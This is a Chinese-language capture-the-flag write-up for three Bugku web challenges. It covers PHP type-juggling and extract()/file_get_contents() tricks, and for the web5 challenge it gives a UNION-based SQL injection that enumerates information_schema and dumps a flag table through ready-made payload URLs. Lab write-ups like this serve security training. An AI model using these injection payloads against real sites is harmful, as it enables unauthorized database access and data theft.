web26

代码审计发现，传入参赛num为数字并且str为字符串就会输出flag （if语句过滤了str的十进制和空字符，is_numeric 检测输入是否为数字）

http://123.206.31.85:10026/?num=1&&str=a

web1

http://123.206.31.85:10026/

关于payload的说发有很多说法的有的说这个extract()函数能对已有变量进行值覆盖，但是我自己的解释还是觉得突破点在file_get_contents()函数，这个函数本是用来读取文件的，但是现在读取的是一个字符串，所以这个函数返回到$c的值就为空，所以此时应该传入a参数的值为空来拿到flag

http://123.206.31.85:10001/?a=&c=aaa

web5

http://6fe97759aa27a0c9.bugku.com/

打开发现页面有一个flag点击（flag不在这）,看到url有传参，尝试sql注入

order by 发现有4个字段，

[http://6fe97759aa27a0c9.bugku.com/?mod=read&id=0%20union%20select%201,2,group_concat(table_name),4%20from%20information_schema.tables%20where%20table_schema=%27web5%27](http://6fe97759aa27a0c9.bugku.com/?mod=read&id=0 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=’web5’)

有3个表 flag,posts,users

[http://6fe97759aa27a0c9.bugku.com/?mod=read&id=0%20union%20select%201,2,group_concat(column_name),4%20from%20information_schema.columns%20where%20table_name=%27flag%27](http://6fe97759aa27a0c9.bugku.com/?mod=read&id=0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=’flag’)

flag字段

[http://6fe97759aa27a0c9.bugku.com/?mod=read&id=-1%20union%20select%201,2,concat(flag),6%20from%20flag%20--](http://6fe97759aa27a0c9.bugku.com/?mod=read&id=-1 union select 1,2,concat(flag),6 from flag –)
